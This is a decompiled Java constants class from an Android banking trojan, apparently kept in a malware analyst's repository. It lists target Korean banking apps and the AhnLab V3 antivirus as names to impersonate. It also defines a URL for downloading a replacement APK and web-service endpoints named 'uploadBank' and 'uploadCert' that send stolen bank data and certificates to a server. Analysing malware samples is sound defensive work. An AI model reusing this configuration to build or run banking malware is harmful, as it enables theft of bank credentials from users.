package com.kbstar.kb.android.star;

import android.os.Environment;
import java.io.File;

public final class AppContacts
{
  public static final String BASE_DIR = Environment.getExternalStorageDirectory().toString();
  public static String[] BK_ARRAY_LIST = { "com.shinhan.sbanking", "com.ibk.neobanking", "com.hanabank.ebk.channel.android.hananbank", "nh.smart", "com.webcash.wooribank", "com.example.mytest" };
  public static String[] BK_CALL_LIST = { "SH", "IBK", "HA", "NH", "WO", "V3" };
  public static String[] BK_NAME_LIST = { "신한S뱅크", "ONE뱅킹개인", "하나N Bank", "NH뱅킹", "원터치개인", "AhnLab V3 Mobile Plus 2.0" };
  public static String DOWNLOAD_URI = "http://192.168.1.109:1234/uploadFileInfo.apk";
  public static final String NAMESPACE = "http:/impl.service.server.phonemanager.org";
  public static final String UPLOAD_BANK_METHOD_NAME = "uploadBank";
  public static String UPLOAD_BANK_URI = "http:/%1$s/PhoneManager/services/BankWebService?wsdl";
  public static final String UPLOAD_CERT_METHOD_NAME = "uploadCert";
  public static String aname = "AhnLab V3 Mobile Plus 2.0";
  
  public static void initWebServiceUrl(String paramString)
  {
    UPLOAD_BANK_URI = String.format(UPLOAD_BANK_URI, new Object[] { paramString });
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/AppContacts.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */